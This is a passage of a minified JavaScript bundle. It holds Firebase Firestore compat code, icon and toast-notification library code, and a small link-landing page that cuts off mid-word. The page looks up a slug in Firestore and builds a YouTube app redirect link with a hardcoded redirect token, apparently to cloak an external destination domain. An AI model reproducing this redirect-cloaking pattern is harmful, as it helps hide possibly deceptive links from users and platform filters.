this._delegate.id}get metadata(){return this._delegate.metadata}get exists(){return this._delegate.exists()}data(e){return this._delegate.data(e)}get(e,t){return this._delegate.get(e,t)}isEqual(e){return JI(this._delegate,e._delegate)}}class gu extends mu{data(e){const t=this._delegate.data(e);return z4(void 0!==t),t}}class ln{constructor(e,t){this.firestore=e,this._delegate=t,this._userDataWriter=new df(e)}where(e,t,n){try{return new ln(this.firestore,ui(this._delegate,c9(e,t,n)))}catch(e){throw un(e,/(orderBy|where)\(\)/,"Query.$1()")}}orderBy(e,t){try{return new ln(this.firestore,ui(this._delegate,h9(e,t)))}catch(e){throw un(e,/(orderBy|where)\(\)/,"Query.$1()")}}limit(e){try{return new ln(this.firestore,ui(this._delegate,d9(e)))}catch(e){throw un(e,"limit()","Query.limit()")}}limitToLast(e){try{return new ln(this.firestore,ui(this._delegate,f9(e)))}catch(e){throw un(e,"limitToLast()","Query.limitToLast()")}}startAt(...e){try{return new ln(this.firestore,ui(this._delegate,p9(...e)))}catch(e){throw un(e,"startAt()","Query.startAt()")}}startAfter(...e){try{return new ln(this.firestore,ui(this._delegate,m9(...e)))}catch(e){throw un(e,"startAfter()","Query.startAfter()")}}endBefore(...e){try{return new ln(this.firestore,ui(this._delegate,g9(...e)))}catch(e){throw un(e,"endBefore()","Query.endBefore()")}}endAt(...e){try{return new ln(this.firestore,ui(this._delegate,y9(...e)))}catch(e){throw un(e,"endAt()","Query.endAt()")}}isEqual(e){return LI(this._delegate,e._delegate)}get(e){let t;return t="cache"===(null==e?void 0:e.source)?x9(this._delegate):"server"===(null==e?void 0:e.source)?I9(this._delegate):T9(this._delegate),t.then((e=>new Sg(this.firestore,new qi(this.firestore._delegate,this._userDataWriter,this._delegate,e._snapshot))))}onSnapshot(...e){const t=rk(e),n=ik(e,(e=>new Sg(this.firestore,new qi(this.firestore._delegate,this._userDataWriter,this._delegate,e._snapshot))));return ZI(this._delegate,t,n)}withConverter(e){return new ln(this.firestore,e?this._delegate.withConverter(Gs.getInstance(this.firestore,e)):this._delegate.withConverter(null))}}class j9{constructor(e,t){this._firestore=e,this._delegate=t}get type(){return this._delegate.type}get doc(){return new gu(this._firestore,this._delegate.doc)}get oldIndex(){return this._delegate.oldIndex}get newIndex(){return this._delegate.newIndex}}class Sg{constructor(e,t){this._firestore=e,this._delegate=t}get query(){return new ln(this._firestore,this._delegate.query)}get metadata(){return this._delegate.metadata}get size(){return this._delegate.size}get empty(){return this._delegate.empty}get docs(){return this._delegate.docs.map((e=>new gu(this._firestore,e)))}docChanges(e){return this._delegate.docChanges(e).map((e=>new j9(this._firestore,e)))}forEach(e,t){this._delegate.forEach((n=>{e.call(t,new gu(this._firestore,n))}))}isEqual(e){return JI(this._delegate,e._delegate)}}class ma extends ln{constructor(e,t){super(e,t),this.firestore=e,this._delegate=t}get id(){return this._delegate.id}get path(){return this._delegate.path}get parent(){const e=this._delegate.parent;return e?new Bn(this.firestore,e):null}doc(e){try{return new Bn(this.firestore,void 0===e?sd(this._delegate):sd(this._delegate,e))}catch(e){throw un(e,"doc()","CollectionReference.doc()")}}add(e){return D9(this._delegate,e).then((e=>new Bn(this.firestore,e)))}isEqual(e){return $I(this._delegate,e._delegate)}withConverter(e){return new ma(this.firestore,e?this._delegate.withConverter(Gs.getInstance(this.firestore,e)):this._delegate.withConverter(null))}}function Ds(e){return ke(e,Ke)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xv{constructor(...e){this._delegate=new ji(...e)}static documentId(){return new Xv(gt.keyField().canonicalString())}isEqual(e){return(e=Et(e))instanceof ji&&this._delegate._internalPath.isEqual(e._internalPath)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vs{constructor(e){this._delegate=e}static serverTimestamp(){const e=O9();return e._methodName="FieldValue.serverTimestamp",new vs(e)}static delete(){const e=b9();return e._methodName="FieldValue.delete",new vs(e)}static arrayUnion(...e){const t=P9(...e);return t._methodName="FieldValue.arrayUnion",new vs(t)}static arrayRemove(...e){const t=$9(...e);return t._methodName="FieldValue.arrayRemove",new vs(t)}static increment(e){const t=L9(e);return t._methodName="FieldValue.increment",new vs(t)}isEqual(e){return this._delegate.isEqual(e._delegate)}}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const q9={Firestore:ek,GeoPoint:nf,Timestamp:et,Blob:pu,Transaction:tk,WriteBatch:nk,DocumentReference:Bn,DocumentSnapshot:mu,Query:ln,QueryDocumentSnapshot:gu,QuerySnapshot:Sg,CollectionReference:ma,FieldPath:Xv,FieldValue:vs,setLogLevel:B9,CACHE_SIZE_UNLIMITED:-1};function Y9(e,t){e.INTERNAL.registerComponent(new Ls("firestore-compat",(e=>{const n=e.getProvider("app-compat").getImmediate(),r=e.getProvider("firestore").getImmediate();return t(n,r)}),"PUBLIC").setServiceProps(Object.assign({},q9)))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function W9(e){Y9(e,((e,t)=>new ek(e,t,new z9))),e.registerVersion(F9,V9)}W9(Cy);const G9={apiKey:"AIzaSyAho-KGRhvpM6x8ku4wtzYFw-oEUkbbzoQ",authDomain:"alowordabila.firebaseapp.com",projectId:"alowordabila",storageBucket:"alowordabila.appspot.com",messagingSenderId:"567899896538",appId:"1:567899896538:web:cbd729a63d9d98319b43e3"},H9=Cy.initializeApp(G9),Jv=H9.firestore(),sk="QUFFLUhqbmtvSWFNczZYemVIRWNHTElQd1Bucl9yT1Y2UXxBQ3Jtc0tsWTFzZ29EOVdrOHg3clAwQkR6R0hVdVdPeGd1eGpsVF9Jc09FTlZRcV9Sekk5T09tYTJKd0VhZjNvOE12WXZSa20tUWhKb19SbmtiQmg2MjZpOTQwWkxPcVZvanhETFBnX2ZZWEZvelZlakQ3R0ExMA";var ok={color:void 0,size:void 0,className:void 0,style:void 0,attr:void 0},WS=Ee.createContext&&Ee.createContext(ok),Ri=globalThis&&globalThis.__assign||function(){return(Ri=Object.assign||function(e){for(var t,n=1,r=arguments.length;n<r;n++)for(var i in t=arguments[n])Object.prototype.hasOwnProperty.call(t,i)&&(e[i]=t[i]);return e}).apply(this,arguments)},K9=globalThis&&globalThis.__rest||function(e,t){var n={};for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&t.indexOf(r)<0&&(n[r]=e[r]);if(null!=e&&"function"==typeof Object.getOwnPropertySymbols){var i=0;for(r=Object.getOwnPropertySymbols(e);i<r.length;i++)t.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(e,r[i])&&(n[r[i]]=e[r[i]])}return n};function ak(e){return e&&e.map((function(e,t){return Ee.createElement(e.tag,Ri({key:t},e.attr),ak(e.child))}))}function Zv(e){return function(t){return Ee.createElement(Q9,Ri({attr:Ri({},e.attr)},t),ak(e.child))}}function Q9(e){var t=function(t){var n,r=e.attr,i=e.size,s=e.title,o=K9(e,["attr","size","title"]),a=i||t.size||"1em";return t.className&&(n=t.className),e.className&&(n=(n?n+" ":"")+e.className),Ee.createElement("svg",Ri({stroke:"currentColor",fill:"currentColor",strokeWidth:"0"},t.attr,r,o,{className:n,style:Ri(Ri({color:e.color||t.color},t.style),e.style),height:a,width:a,xmlns:"http://www.w3.org/2000/svg"}),s&&Ee.createElement("title",null,s),e.children)};return void 0!==WS?Ee.createElement(WS.Consumer,null,(function(e){return t(e)})):t(ok)}function X9(e){return Zv({tag:"svg",attr:{viewBox:"0 0 448 512"},child:[{tag:"path",attr:{d:"M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"}}]})(e)}function lk(e){return Zv({tag:"svg",attr:{viewBox:"0 0 448 512"},child:[{tag:"path",attr:{d:"M320 448v40c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V120c0-13.255 10.745-24 24-24h72v296c0 30.879 25.121 56 56 56h168zm0-344V0H152c-13.255 0-24 10.745-24 24v368c0 13.255 10.745 24 24 24h272c13.255 0 24-10.745 24-24V128H344c-13.2 0-24-10.8-24-24zm120.971-31.029L375.029 7.029A24 24 0 0 0 358.059 0H352v96h96v-6.059a24 24 0 0 0-7.029-16.97z"}}]})(e)}function J9(e){return Zv({tag:"svg",attr:{viewBox:"0 0 512 512"},child:[{tag:"path",attr:{d:"M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"}}]})(e)}function uk(e){var t,n,r="";if("string"==typeof e||"number"==typeof e)r+=e;else if("object"==typeof e)if(Array.isArray(e))for(t=0;t<e.length;t++)e[t]&&(n=uk(e[t]))&&(r&&(r+=" "),r+=n);else for(t in e)e[t]&&(r&&(r+=" "),r+=t);return r}function wi(){for(var e,t,n=0,r="";n<arguments.length;)(e=arguments[n++])&&(t=uk(e))&&(r&&(r+=" "),r+=t);return r}const Rl=e=>"number"==typeof e&&!isNaN(e),Hs=e=>"string"==typeof e,En=e=>"function"==typeof e,ah=e=>Hs(e)||En(e)?e:null,Rp=e=>$.isValidElement(e)||Hs(e)||En(e)||Rl(e);function Z9(e,t,n){void 0===n&&(n=300);const{scrollHeight:r,style:i}=e;requestAnimationFrame((()=>{i.minHeight="initial",i.height=r+"px",i.transition=`all ${n}ms`,requestAnimationFrame((()=>{i.height="0",i.padding="0",i.margin="0",setTimeout(t,n)}))}))}function ff(e){let{enter:t,exit:n,appendPosition:r=!1,collapse:i=!0,collapseDuration:s=300}=e;return function(e){let{children:o,position:a,preventExitTransition:l,done:u,nodeRef:c,isIn:h}=e;const d=r?`${t}--${a}`:t,f=r?`${n}--${a}`:n,p=$.useRef(0);return $.useLayoutEffect((()=>{const e=c.current,t=d.split(" "),n=r=>{r.target===c.current&&(e.dispatchEvent(new Event("d")),e.removeEventListener("animationend",n),e.removeEventListener("animationcancel",n),0===p.current&&"animationcancel"!==r.type&&e.classList.remove(...t))};e.classList.add(...t),e.addEventListener("animationend",n),e.addEventListener("animationcancel",n)}),[]),$.useEffect((()=>{const e=c.current,t=()=>{e.removeEventListener("animationend",t),i?Z9(e,u,s):u()};h||(l?t():(p.current=1,e.className+=` ${f}`,e.addEventListener("animationend",t)))}),[h]),Ee.createElement(Ee.Fragment,null,o)}}function GS(e,t){return{content:e.content,containerId:e.props.containerId,id:e.props.toastId,theme:e.props.theme,type:e.props.type,data:e.props.data||{},isLoading:e.props.isLoading,icon:e.props.icon,status:t}}const Ln={list:new Map,emitQueue:new Map,on(e,t){return this.list.has(e)||this.list.set(e,[]),this.list.get(e).push(t),this},off(e,t){if(t){const n=this.list.get(e).filter((e=>e!==t));return this.list.set(e,n),this}return this.list.delete(e),this},cancelEmit(e){const t=this.emitQueue.get(e);return t&&(t.forEach(clearTimeout),this.emitQueue.delete(e)),this},emit(e){this.list.has(e)&&this.list.get(e).forEach((t=>{const n=setTimeout((()=>{t(...[].slice.call(arguments,1))}),0);this.emitQueue.has(e)||this.emitQueue.set(e,[]),this.emitQueue.get(e).push(n)}))}},Fc=e=>{let{theme:t,type:n,...r}=e;return Ee.createElement("svg",{viewBox:"0 0 24 24",width:"100%",height:"100%",fill:"colored"===t?"currentColor":`var(--toastify-icon-color-${n})`,...r})},Ap={info:function(e){return Ee.createElement(Fc,{...e},Ee.createElement("path",{d:"M12 0a12 12 0 1012 12A12.013 12.013 0 0012 0zm.25 5a1.5 1.5 0 11-1.5 1.5 1.5 1.5 0 011.5-1.5zm2.25 13.5h-4a1 1 0 010-2h.75a.25.25 0 00.25-.25v-4.5a.25.25 0 00-.25-.25h-.75a1 1 0 010-2h1a2 2 0 012 2v4.75a.25.25 0 00.25.25h.75a1 1 0 110 2z"}))},warning:function(e){return Ee.createElement(Fc,{...e},Ee.createElement("path",{d:"M23.32 17.191L15.438 2.184C14.728.833 13.416 0 11.996 0c-1.42 0-2.733.833-3.443 2.184L.533 17.448a4.744 4.744 0 000 4.368C1.243 23.167 2.555 24 3.975 24h16.05C22.22 24 24 22.044 24 19.632c0-.904-.251-1.746-.68-2.44zm-9.622 1.46c0 1.033-.724 1.823-1.698 1.823s-1.698-.79-1.698-1.822v-.043c0-1.028.724-1.822 1.698-1.822s1.698.79 1.698 1.822v.043zm.039-12.285l-.84 8.06c-.057.581-.408.943-.897.943-.49 0-.84-.367-.896-.942l-.84-8.065c-.057-.624.25-1.095.779-1.095h1.91c.528.005.84.476.784 1.1z"}))},success:function(e){return Ee.createElement(Fc,{...e},Ee.createElement("path",{d:"M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z"}))},error:function(e){return Ee.createElement(Fc,{...e},Ee.createElement("path",{d:"M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z"}))},spinner:function(){return Ee.createElement("div",{className:"Toastify__spinner"})}};function e3(e){const[,t]=$.useReducer((e=>e+1),0),[n,r]=$.useState([]),i=$.useRef(null),s=$.useRef(new Map).current,o=e=>-1!==n.indexOf(e),a=$.useRef({toastKey:1,displayedToast:0,count:0,queue:[],props:e,containerId:null,isToastActive:o,getToast:e=>s.get(e)}).current;function l(e){let{containerId:t}=e;const{limit:n}=a.props;!n||t&&a.containerId!==t||(a.count-=a.queue.length,a.queue=[])}function u(e){r((t=>null==e?[]:t.filter((t=>t!==e))))}function c(){const{toastContent:e,toastProps:t,staleId:n}=a.queue.shift();d(e,t,n)}function h(e,n){let{delay:r,staleId:o,...l}=n;if(!Rp(e)||(h=l,!i.current||a.props.enableMultiContainer&&h.containerId!==a.props.containerId||s.has(h.toastId)&&null==h.updateId))return;var h;const{toastId:f,updateId:p,data:m}=l,{props:g}=a,y=()=>u(f),v=null==p;v&&a.count++;const w={...g,style:g.toastStyle,key:a.toastKey++,...Object.fromEntries(Object.entries(l).filter((e=>{let[t,n]=e;return null!=n}))),toastId:f,updateId:p,data:m,closeToast:y,isIn:!1,className:ah(l.className||g.toastClassName),bodyClassName:ah(l.bodyClassName||g.bodyClassName),progressClassName:ah(l.progressClassName||g.progressClassName),autoClose:!l.isLoading&&(b=l.autoClose,_=g.autoClose,!1===b||Rl(b)&&b>0?b:_),deleteToast(){const e=GS(s.get(f),"removed");s.delete(f),Ln.emit(4,e);const n=a.queue.length;if(a.count=null==f?a.count-a.displayedToast:a.count-1,a.count<0&&(a.count=0),n>0){const e=null==f?a.props.limit:1;if(1===n||1===e)a.displayedToast++,c();else{const t=e>n?n:e;a.displayedToast=t;for(let e=0;e<t;e++)c()}}else t()}};var b,_;w.iconOut=function(e){let{theme:t,type:n,isLoading:r,icon:i}=e,s=null;const o={theme:t,type:n};return!1===i||(En(i)?s=i(o):$.isValidElement(i)?s=$.cloneElement(i,o):Hs(i)||Rl(i)?s=i:r?s=Ap.spinner():n in Ap&&(s=Ap[n](o))),s}(w),En(l.onOpen)&&(w.onOpen=l.onOpen),En(l.onClose)&&(w.onClose=l.onClose),w.closeButton=g.closeButton,!1===l.closeButton||Rp(l.closeButton)?w.closeButton=l.closeButton:!0===l.closeButton&&(w.closeButton=!Rp(g.closeButton)||g.closeButton);let S=e;$.isValidElement(e)&&!Hs(e.type)?S=$.cloneElement(e,{closeToast:y,toastProps:w,data:m}):En(e)&&(S=e({closeToast:y,toastProps:w,data:m})),g.limit&&g.limit>0&&a.count>g.limit&&v?a.queue.push({toastContent:S,toastProps:w,staleId:o}):Rl(r)?setTimeout((()=>{d(S,w,o)}),r):d(S,w,o)}function d(e,t,n){const{toastId:i}=t;n&&s.delete(n);const o={content:e,props:t};s.set(i,o),r((e=>[...e,i].filter((e=>e!==n)))),Ln.emit(4,GS(o,null==o.props.updateId?"added":"updated"))}return $.useEffect((()=>(a.containerId=e.containerId,Ln.cancelEmit(3).on(0,h).on(1,(e=>i.current&&u(e))).on(5,l).emit(2,a),()=>{s.clear(),Ln.emit(3,a)})),[]),$.useEffect((()=>{a.props=e,a.isToastActive=o,a.displayedToast=n.length})),{getToastToRender:function(t){const n=new Map,r=Array.from(s.values());return e.newestOnTop&&r.reverse(),r.forEach((e=>{const{position:t}=e.props;n.has(t)||n.set(t,[]),n.get(t).push(e)})),Array.from(n,(e=>t(e[0],e[1])))},containerRef:i,isToastActive:o}}function HS(e){return e.targetTouches&&e.targetTouches.length>=1?e.targetTouches[0].clientX:e.clientX}function KS(e){return e.targetTouches&&e.targetTouches.length>=1?e.targetTouches[0].clientY:e.clientY}function t3(e){const[t,n]=$.useState(!1),[r,i]=$.useState(!1),s=$.useRef(null),o=$.useRef({start:0,x:0,y:0,delta:0,removalDistance:0,canCloseOnClick:!0,canDrag:!1,boundingRect:null,didMove:!1}).current,a=$.useRef(e),{autoClose:l,pauseOnHover:u,closeToast:c,onClick:h,closeOnClick:d}=e;function f(t){if(e.draggable){"touchstart"===t.nativeEvent.type&&t.nativeEvent.preventDefault(),o.didMove=!1,document.addEventListener("mousemove",y),document.addEventListener("mouseup",v),document.addEventListener("touchmove",y),document.addEventListener("touchend",v);const n=s.current;o.canCloseOnClick=!0,o.canDrag=!0,o.boundingRect=n.getBoundingClientRect(),n.style.transition="",o.x=HS(t.nativeEvent),o.y=KS(t.nativeEvent),"x"===e.draggableDirection?(o.start=o.x,o.removalDistance=n.offsetWidth*(e.draggablePercent/100)):(o.start=o.y,o.removalDistance=n.offsetHeight*(80===e.draggablePercent?1.5*e.draggablePercent:e.draggablePercent/100))}}function p(t){if(o.boundingRect){const{top:n,bottom:r,left:i,right:s}=o.boundingRect;"touchend"!==t.nativeEvent.type&&e.pauseOnHover&&o.x>=i&&o.x<=s&&o.y>=n&&o.y<=r?g():m()}}function m(){n(!0)}function g(){n(!1)}function y(n){const r=s.current;o.canDrag&&r&&(o.didMove=!0,t&&g(),o.x=HS(n),o.y=KS(n),o.delta="x"===e.draggableDirection?o.x-o.start:o.y-o.start,o.start!==o.x&&(o.canCloseOnClick=!1),r.style.transform=`translate${e.draggableDirection}(${o.delta}px)`,r.style.opacity=""+(1-Math.abs(o.delta/o.removalDistance)))}function v(){document.removeEventListener("mousemove",y),document.removeEventListener("mouseup",v),document.removeEventListener("touchmove",y),document.removeEventListener("touchend",v);const t=s.current;if(o.canDrag&&o.didMove&&t){if(o.canDrag=!1,Math.abs(o.delta)>o.removalDistance)return i(!0),void e.closeToast();t.style.transition="transform 0.2s, opacity 0.2s",t.style.transform=`translate${e.draggableDirection}(0)`,t.style.opacity="1"}}$.useEffect((()=>{a.current=e})),$.useEffect((()=>(s.current&&s.current.addEventListener("d",m,{once:!0}),En(e.onOpen)&&e.onOpen($.isValidElement(e.children)&&e.children.props),()=>{const e=a.current;En(e.onClose)&&e.onClose($.isValidElement(e.children)&&e.children.props)})),[]),$.useEffect((()=>(e.pauseOnFocusLoss&&(document.hasFocus()||g(),window.addEventListener("focus",m),window.addEventListener("blur",g)),()=>{e.pauseOnFocusLoss&&(window.removeEventListener("focus",m),window.removeEventListener("blur",g))})),[e.pauseOnFocusLoss]);const w={onMouseDown:f,onTouchStart:f,onMouseUp:p,onTouchEnd:p};return l&&u&&(w.onMouseEnter=g,w.onMouseLeave=m),d&&(w.onClick=e=>{h&&h(e),o.canCloseOnClick&&c()}),{playToast:m,pauseToast:g,isRunning:t,preventExitTransition:r,toastRef:s,eventHandlers:w}}function ck(e){let{closeToast:t,theme:n,ariaLabel:r="close"}=e;return Ee.createElement("button",{className:`Toastify__close-button Toastify__close-button--${n}`,type:"button",onClick:e=>{e.stopPropagation(),t(e)},"aria-label":r},Ee.createElement("svg",{"aria-hidden":"true",viewBox:"0 0 14 16"},Ee.createElement("path",{fillRule:"evenodd",d:"M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z"})))}function n3(e){let{delay:t,isRunning:n,closeToast:r,type:i="default",hide:s,className:o,style:a,controlledProgress:l,progress:u,rtl:c,isIn:h,theme:d}=e;const f=s||l&&0===u,p={...a,animationDuration:`${t}ms`,animationPlayState:n?"running":"paused",opacity:f?0:1};l&&(p.transform=`scaleX(${u})`);const m=wi("Toastify__progress-bar",l?"Toastify__progress-bar--controlled":"Toastify__progress-bar--animated",`Toastify__progress-bar-theme--${d}`,`Toastify__progress-bar--${i}`,{"Toastify__progress-bar--rtl":c}),g=En(o)?o({rtl:c,type:i,defaultClassName:m}):wi(m,o);return Ee.createElement("div",{role:"progressbar","aria-hidden":f?"true":"false","aria-label":"notification timer",className:g,style:p,[l&&u>=1?"onTransitionEnd":"onAnimationEnd"]:l&&u<1?null:()=>{h&&r()}})}const r3=e=>{const{isRunning:t,preventExitTransition:n,toastRef:r,eventHandlers:i}=t3(e),{closeButton:s,children:o,autoClose:a,onClick:l,type:u,hideProgressBar:c,closeToast:h,transition:d,position:f,className:p,style:m,bodyClassName:g,bodyStyle:y,progressClassName:v,progressStyle:w,updateId:b,role:_,progress:S,rtl:E,toastId:T,deleteToast:k,isIn:x,isLoading:I,iconOut:C,closeOnClick:D,theme:M}=e,N=wi("Toastify__toast",`Toastify__toast-theme--${M}`,`Toastify__toast--${u}`,{"Toastify__toast--rtl":E},{"Toastify__toast--close-on-click":D}),A=En(p)?p({rtl:E,position:f,type:u,defaultClassName:N}):wi(N,p),L=!!S||!a,O={closeToast:h,type:u,theme:M};let R=null;return!1===s||(R=En(s)?s(O):$.isValidElement(s)?$.cloneElement(s,O):ck(O)),Ee.createElement(d,{isIn:x,done:k,position:f,preventExitTransition:n,nodeRef:r},Ee.createElement("div",{id:T,onClick:l,className:A,...i,style:m,ref:r},Ee.createElement("div",{...x&&{role:_},className:En(g)?g({type:u}):wi("Toastify__toast-body",g),style:y},null!=C&&Ee.createElement("div",{className:wi("Toastify__toast-icon",{"Toastify--animate-icon Toastify__zoom-enter":!I})},C),Ee.createElement("div",null,o)),R,Ee.createElement(n3,{...b&&!L?{key:`pb-${b}`}:{},rtl:E,theme:M,delay:a,isRunning:t,isIn:x,closeToast:h,hide:c,type:u,style:w,className:v,controlledProgress:L,progress:S||0})))},pf=function(e,t){return void 0===t&&(t=!1),{enter:`Toastify--animate Toastify__${e}-enter`,exit:`Toastify--animate Toastify__${e}-exit`,appendPosition:t}},i3=ff(pf("bounce",!0));ff(pf("slide",!0)),ff(pf("zoom")),ff(pf("flip"));const ad=$.forwardRef(((e,t)=>{const{getToastToRender:n,containerRef:r,isToastActive:i}=e3(e),{className:s,style:o,rtl:a,containerId:l}=e;function u(e){const t=wi("Toastify__toast-container",`Toastify__toast-container--${e}`,{"Toastify__toast-container--rtl":a});return En(s)?s({position:e,rtl:a,defaultClassName:t}):wi(t,ah(s))}return $.useEffect((()=>{t&&(t.current=r.current)}),[]),Ee.createElement("div",{ref:r,className:"Toastify",id:l},n(((e,t)=>{const n=t.length?{...o}:{...o,pointerEvents:"none"};return Ee.createElement("div",{className:u(e),style:n,key:`container-${e}`},t.map(((e,n)=>{let{content:r,props:s}=e;return Ee.createElement(r3,{...s,isIn:i(s.toastId),style:{...s.style,"--nth":n+1,"--len":t.length},key:`toast-${s.key}`},r)})))})))}));ad.displayName="ToastContainer",ad.defaultProps={position:"top-right",transition:i3,autoClose:5e3,closeButton:ck,pauseOnHover:!0,pauseOnFocusLoss:!0,closeOnClick:!0,draggable:!0,draggablePercent:80,draggableDirection:"x",role:"alert",theme:"light"};let bp,fs=new Map,dl=[],s3=1;function hk(){return""+s3++}function o3(e){return e&&(Hs(e.toastId)||Rl(e.toastId))?e.toastId:hk()}function Al(e,t){return fs.size>0?Ln.emit(0,e,t):dl.push({content:e,options:t}),t.toastId}function ld(e,t){return{...t,type:t&&t.type||e,toastId:o3(t)}}function Vc(e){return(t,n)=>Al(t,ld(e,n))}function Ue(e,t){return Al(e,ld("default",t))}function a3(){const{slug:e}=x2(),[t,n]=$.useState(""),[r,i]=$.useState(""),s=encodeURIComponent(r);$.useEffect((()=>{Jv.collection("urls").where("slug","==",e).onSnapshot((t=>{t.empty&&alert("URL not found");let r=t.docs[0].data().url.mainDomain;i(`${r}/gone/${e}`),console.log(s),n(`vnd.youtube://youtube.com/redirect?event=comments&redir_token=${sk}&q=${r}/gone/${e}&html_redirect=1`)}))}),[e]);return pe.jsxs("div",{className:"custom-bg min-h-screen flex items-center justify-center gap-4 flex-col",children:[pe.jsx("div",{children:pe.jsx(Gb,{to:t,className:"btn px-20 rounded-full vert-move",children:"Join Here"})}),pe.jsxs("div",{className:"flex flex-col justify-center mx-3 gap-5",children:[pe.jsxs("p",{className:"p-3 bg-black/25 text-white rounded-lg",children:["If you can't enter the site then click the"," ",pe.jsx("span",{className:"font-bold text-orange-600",children:'"Copy link"'})," button 👇 and search it to your browser."]}),pe.jsxs("button",{onClick:async()=>{try{await navigator.clipboard.writeText(r),Ue.success("Link Copied. Now past it in your browser.")}catch(e){console.error("Failed to copy: ",e)}},className:"btn btn-success vert-move text-white gap-2 px-16 rounded-full flex items-center",children:[pe.jsx(lk,{})," Copy 